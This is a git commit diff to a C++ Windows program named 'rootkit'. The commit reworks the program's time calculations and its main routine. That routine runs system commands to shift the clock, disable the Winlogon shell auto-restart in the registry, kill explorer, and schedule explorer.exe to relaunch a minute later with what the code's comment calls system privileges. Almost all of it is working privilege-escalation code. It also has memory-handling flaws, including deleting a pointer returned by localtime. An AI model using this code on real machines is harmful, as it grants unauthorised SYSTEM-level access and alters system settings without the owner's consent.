3502e5719cb90c19cf3578bba05b7d09760d7cec
Michael Jereza <35281729+MichaelJereza@users.noreply.github.com>
2021-02-09 00:18:17 -0800

    Fixed timing iteration

--- rootkit/rootkit.cpp
+++ rootkit/rootkit.cpp
@@ -6,10 +6,13 @@
 #include <string>
 #include <cstring>
 #include <cmath>
+#include <iostream>
+// using namespace std;
 
 int run_command(STARTUPINFO* si, PROCESS_INFORMATION* pi, char* command) 
 {
-    if (!CreateProcess(NULL,   // No module name (use command line)
+    if (!CreateProcess(
+        NULL,   // No module name (use command line)
         ((LPSTR) command),        // file to run
         NULL,           // Process handle not inheritable
         NULL,           // Thread handle not inheritable
@@ -22,51 +25,81 @@ int run_command(STARTUPINFO* si, PROCESS_INFORMATION* pi, char* command)
     )
     {
         int error = GetLastError();
-        puts("=======================");
-        printf("Rootkit failed (%d).\n", error);
-        puts(command);
-        puts("=======================");
+        printf("\nERROR: %d Create Process FAILED:\n%s\n", error, command);
         return error;
     }
     return 0;
 }
 
-char* get_incremented_time(int minutes_from_now)
+
+struct tm* get_time()
 {
-    // C++ time is just awful
-    // Returns HH:MM:(SS+10)
-    // http://www.cplusplus.com/reference/ctime/strftime/
     time_t rawtime;
-    struct tm * timeinfo;
-    char* buffer = new char[9];
 
     time (&rawtime);
-    timeinfo = localtime (&rawtime);
 
-    // Might not trigger if too soon
-    if(timeinfo->tm_sec < 50)
-    {
-        timeinfo->tm_min += minutes_from_now;
-    } 
-    else 
-    {
-        timeinfo->tm_min += minutes_from_now+1;
-    }
+    struct tm* time = new struct tm;
+    time = localtime (&rawtime);
+    return time;
+}
 
-    if(timeinfo->tm_min >= 60)
-    {
-        timeinfo->tm_hour += floor(timeinfo->tm_min / 60);
-        timeinfo->tm_min = timeinfo->tm_min % 60;
-    }
-
-    if(timeinfo->tm_hour > 23)
-    {
-        timeinfo->tm_hour = 0;
-    }
-
-    strftime (buffer, 6, "%H:%M", timeinfo);
-
+// If timeinfo isn't provided get current time
+const char * default_format = "%H:%M:%S";
+char* get_time_string(struct tm* timeinfo = get_time(), char* timeformat=(char*)default_format)
+{
+    char* buffer = new char[10];
+    strftime (buffer, 9, timeformat, timeinfo);
     return buffer;
+}
+
+// This returns a time string of format %H:%M or %H:%M:%S
+// It takes an optional seed argument, which specifies what time for seconds_from_now, needed for calculating multiple times for the same moment
+struct tm* get_incremented_time(int seconds_from_now, struct tm* seed=get_time())
+{
+    struct tm* timeinfo = new struct tm;
+    memcpy(timeinfo, seed, sizeof(struct tm));
+
+    int unit_Total;
+
+    // Calculate seconds;
+    unit_Total = seconds_from_now + timeinfo->tm_sec;
+
+    if(unit_Total < 0)
+    {
+        unit_Total = 60+unit_Total;
+        timeinfo->tm_min = timeinfo->tm_min-1;
+
+        if(timeinfo->tm_min < 0) {
+            timeinfo->tm_min = 60+timeinfo->tm_min;
+            timeinfo->tm_hour = timeinfo->tm_hour-1;
+            
+            if(timeinfo->tm_hour < 0) {
+                timeinfo->tm_hour = timeinfo->tm_hour + 24;
+            }
+        }
+    }
+
+    timeinfo->tm_sec = unit_Total % 60;
+
+    // Calculate minutes;
+    unit_Total = floor(unit_Total/60) + timeinfo->tm_min;
+    if(unit_Total < 0)
+    {
+        unit_Total = 60+unit_Total;
+    }
+
+    timeinfo->tm_min = unit_Total % 60;
+
+    // Calculate hours;
+    unit_Total = floor(unit_Total/60) + timeinfo->tm_hour;
+    if(unit_Total < 0)
+    {
+        unit_Total = 24+unit_Total;
+    }
+
+    timeinfo->tm_hour = unit_Total % 24;
+
+    return timeinfo;
 }
 
 char* create_schedule_string(char* command, char* time)
@@ -91,30 +124,76 @@ int main( )
     si.cb = sizeof(si);
     ZeroMemory( &pi, sizeof(pi) );    
 
+    printf("\nBeginning setup...\n");
+
     char command_KillExplorer[] = "tskill /A explorer";
     char command_StopShellRestart[] = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /t REG_DWORD /V \"AutoRestartShell\" /d 0 /f";
     // Might need a better way to get sessionID, for now 0 works
     char command_Msg[] = "msg 0 \"Rootkit Enabled\"";
     char command_OpenExplorer[] = "explorer.exe";
 
-    char* time = get_incremented_time(1);
-    char* schedule_Msg = create_schedule_string(command_Msg, time);
-    char* schedule_Explorer = create_schedule_string(command_OpenExplorer, time);
+    // Formatting for get_incremented_time which returns a time string of this format
+    char min_Format[] = "%H:%M";
+    char sec_Format[] = "%H:%M:%S";
 
+    // Need to use a time seed for both these calculation or it could be a race case
+    struct tm* right_now = get_time();
+
+    // Provide the seed for right_now
+    struct tm* increment_one_minute = get_incremented_time(60-right_now->tm_sec, right_now);
+    // Get strings
+    char* rightNow = get_time_string(right_now, sec_Format);
+    char* oneMinuteLater = get_time_string(increment_one_minute, min_Format);
+    char* twoSecondsBeforeOneMinuteLater = get_time_string(get_incremented_time(-2, increment_one_minute), sec_Format);
+    char* twoSecondsAfterStart = get_time_string(get_incremented_time(2, right_now), sec_Format);
+
+    // char* schedule_Msg = create_schedule_string(command_Msg, time);
+    char* schedule_Explorer = create_schedule_string(command_OpenExplorer, oneMinuteLater);
+
+    char command_TimeSkip[20] = "0";
+    strcpy(command_TimeSkip, "time ");
+    strcat(command_TimeSkip, twoSecondsBeforeOneMinuteLater);
+
+    printf("\nStarting rootkit: %s \n", rightNow);
+    // Skip the time to two seconds before one minute later, so only 2 seconds of perceived delay
+    run_command(&si, &pi, command_TimeSkip);
+
+    // Stop the shell from automatically restarting
     run_command(&si, &pi, command_StopShellRestart);
+
+    // Kill the explorer
     run_command(&si, &pi, command_KillExplorer);
-    // run_command(&si, &pi, command_Msg);
-    run_command(&si, &pi, schedule_Msg);
-    run_command(&si, &pi, schedule_Explorer);
+
+    // Print a message saying the rootkit is enabled
+    run_command(&si, &pi, command_Msg);
+
+    // Open the explorer one minute later with the sheduler, it will have system privileges
+    run_command(&si, &pi, schedule_Explorer);    
+
+    // Wait for the time skip then set the time back
+    // Sleep(2000);
+    // printf("Time jumped: %s\n", twoSecondsBeforeOneMinuteLater);
+
+    // DEBUG
+    // printf("oneMinuteLater: %s\n", oneMinuteLater);
+    // printf("twoSecondsBeforeOneMinuteLater: %s\n", twoSecondsBeforeOneMinuteLater);
+
+    // Reset the time
+    // command_TimeSkip[20] = 0;
+    // strcat(command_TimeSkip, "time ");
+    // strcat(command_TimeSkip, twoSecondsAfterStart);
+
+    // run_command(&si, &pi, command_TimeSkip);
 
     // Wait until child process exits.
     WaitForSingleObject( pi.hProcess, INFINITE );
 
     // Cleanup
-    delete time;
+    delete right_now;
 
     // Close process and thread handles. 
     CloseHandle( pi.hProcess );
     CloseHandle( pi.hThread );
+
     return 0;
 }
